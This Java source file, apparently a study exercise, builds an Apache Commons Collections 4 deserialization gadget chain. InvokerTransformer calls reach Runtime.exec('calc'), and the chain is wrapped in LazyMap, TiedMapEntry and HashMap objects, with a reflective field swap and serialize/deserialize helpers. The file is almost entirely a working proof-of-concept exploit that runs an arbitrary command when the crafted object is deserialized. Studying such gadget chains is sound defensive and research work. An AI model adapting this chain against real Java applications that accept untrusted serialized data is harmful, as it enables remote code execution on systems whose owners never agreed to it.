package com.mechoy;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/3/30
 */
public class CC2Test {
    public static String path = "ser.bin";


    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        Transformer<Object,Object>[] transformer = new Transformer[]{
                new ConstantTransformer<Object,Object>(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer<Object> chainedTransformer = new ChainedTransformer<>(transformer);

        HashMap<Object, Object> map = new HashMap<>();
        // LazyMap的获取方法变了
        Map lazyMap = LazyMap.lazyMap(map,new ConstantTransformer("q"));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"222");
        lazyMap.remove("111");

        Class aClass = LazyMap.class;
        Field factory = aClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);

//        serialize(hashMap);
        deserialize();
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }
}
